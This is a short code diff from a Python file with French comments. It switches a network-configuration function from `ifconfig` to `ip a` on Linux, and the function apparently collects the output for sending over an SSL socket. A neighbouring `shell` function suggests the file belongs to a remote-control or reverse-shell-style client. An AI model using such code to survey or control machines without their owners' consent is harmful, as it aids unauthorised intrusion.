@@ -54,8 +54,8 @@ def shell(ssl_socket):
 def ipconfig(ssl_socket):
     os_type = os.name  # Récupération du nom de l'OS de la machine
     if os_type == "posix":  # Test si la machine est une Linux
-        conf = subprocess.run(['ifconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)  # Exécution de la commande "ifconfig" et stockage de ses sorties
-        conf_to_send = conf.stdout + conf.stderr  # Concaténation des sorties de la commande "ifconfig"
+        conf = subprocess.run(['ip', 'a'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)  # Exécution de la commande "ip a" et stockage de ses sorties
+        conf_to_send = conf.stdout + conf.stderr  # Concaténation des sorties de la commande "ip a"
     elif os_type == "nt":  # Test si la machine est une Windows
         conf = subprocess.run(['ipconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)  # Exécution de la commande "ipconfig" et stockage de ses sorties
         conf_to_send = conf.stdout + conf.stderr  # Concaténation des sorties de la commande "ipconfig"
